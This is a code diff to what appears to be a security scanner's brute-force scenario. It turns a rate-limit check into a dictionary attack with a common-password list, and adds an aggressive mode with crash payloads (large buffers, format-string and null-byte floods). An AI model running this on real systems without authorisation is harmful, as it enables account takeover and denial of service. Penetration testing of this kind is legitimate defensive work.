@@ -4,33 +4,106 @@ from ..scenarios import SimpleScenario
 
 def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """
-    Simple Brute Force / Credential Stuffing Simulation.
-    Checks if rate limiting is absent.
+    Real Dictionary Attack / Rate Limit Check.
     """
     username = scenario.config.get("user", "admin")
-    count = int(scenario.config.get("count", 20))
     
-    # We send 20 bad passwords. 
-    # If all return 401/200 OK (fast) without 429 Too Many Requests -> Logic Flaw.
+    # 1. Real Common Passwords
+    # 1. Real Common Passwords
+    passwords = [
+        "123456", "password", "12345678", "qwerty", "123456789",
+        "12345", "111111", "1234567", "dragon", "admin",
+        "welcome", "orange", "password123", "letmein", "monkey",
+        "system", "login", "changeme", "sunshine", "princess", "soulmad",
+        "charlie", "123123", "1234", "root", "pass", "football", 
+        "computer", "george", "1234567890", "master", "shadow", 
+        "superman", "jessica", "daniel", "solo", "bebe", "trust", 
+        "amanda", "chicken", "hello", "barbie", "trinity", "ashley", 
+        "nicole", "secure", "google", "hacker", "freedom", "cookie",
+        "database", "pookie", "scout", "ninja", "masterkey",
+        "starwars", "pokemon", "williams", "jordan", "killer",
+        "bailey", "misty", "simon", "fucker", "fuckyou",
+        "000000", "1111", "1212", "7777777", "696969",
+        "qazwsx", "zxcvbn", "guest", "user", "manager",
+        "sysadmin", "support", "service", "oracle", "apache",
+        "tomcat", "postgres", "mysql", "java", "server",
+        "abc12345", "test1234", "password01", "admin123", "secret",
+        "god", "jesus", "love", "angel", "beautiful"
+    ]
     
+    # 2. Server Crash Payloads (Buffer Overflow / DoS) - User Request
+    if scenario.config.get("aggressive"):
+        print("    [!!!] Adding SERVER CRASH Payloads to Brute Force dictionary...")
+        passwords.extend([
+            "A" * 5000, # Buffer Overflow Attempt (5KB)
+            "B" * 20000, # Buffer Overflow Attempt (20KB)
+            "'" * 500, # Quote Flooding (SQL/Parser Stress)
+            "%s" * 200, # Format String DoS
+            "\x00" * 500, # Null Byte Flood
+            "\n" * 500, # Newline Flood
+        ])
+    
+    count = len(passwords)
+    
+    # Pre-check
+    check = client.send(scenario.method, scenario.target, json_body={"u": "test", "p": "test"})
+    if check.status_code in [404, 405]:
+        if scenario.config.get("aggressive"):
+             print(f"    [!] Endpoint {scenario.target} returned {check.status_code}, but AGGRESSIVE mode is ON. Brute-forcing anyway...")
+        else:
+             return {
+                "scenario_id": scenario.id,
+                "attack_type": "brute_force",
+                "passed": True,
+                "skipped": True,
+                "details": f"Endpoint returned {check.status_code}. Skipping attack."
+            }
+
     responses = []
-    for i in range(count):
-        body = {"username": username, "password": f"pass_{i}"}
-        resp = client.send(scenario.method, scenario.target, json_body=body)
-        responses.append(resp.status_code)
-        
-    # Analysis
-    rate_limited = 429 in responses
-    # Or if server started blocking (403/Connection Reset)
+    success_creds = []
     
-    passed = rate_limited
-    details = f"Sent {count} requests. No 429 received."
+    for i, pwd in enumerate(passwords):
+        body = {"username": username, "password": pwd}
+        # Try both JSON and Form just in case
+        resp = client.send(scenario.method, scenario.target, json_body=body)
+        
+        if resp.status_code != 0:
+            responses.append(resp.status_code)
+            
+            # Check for Successful Login!
+            # If we get a redirect (302) or a 200 with specific token/welcome message
+            # different from the baseline failure
+            if resp.status_code == 200 and "token" in resp.text.lower():
+                success_creds.append(pwd)
+            elif resp.status_code in [302, 301] and "login" not in resp.headers.get("Location", ""):
+                 success_creds.append(pwd)
+
+    if success_creds:
+         return {
+            "scenario_id": scenario.id,
+            "attack_type": "brute_force",
+            "passed": False,
+            "details": f"[CRITICAL] Weak Credentials Found! User: {username}, Passwords: {', '.join(success_creds)}"
+        }
+
+    # Rate Limiting Check
+    rate_limited = 429 in responses or 403 in responses
+    
+    details = f"Sent {count} request with common passwords. No Rate Limit detected."
+    passed = False # Default fail if no protection
     
     if rate_limited:
-        details = "Rate Limit (429) detected."
-    elif 403 in responses:
-        details = "Soft Block (403) detected."
+        details = "Rate Limiting Protection Active (429/403 Detected)."
         passed = True
+    elif all(r == 401 for r in responses):
+        # Good, at least it denied access, but did it slow down?
+        # For now, if no 429, we flag as potential issue
+        details = "No Rate Limit detected (All 401s)."
+        passed = False
+    elif all(r == 200 for r in responses):
+        # API returns 200 for everything? That's bad design usually, or we can't tell failure.
+        details = "Endpoint returns 200 OK for all attempts. Ambiguous."
+        passed = False
         
     return {
         "scenario_id": scenario.id,
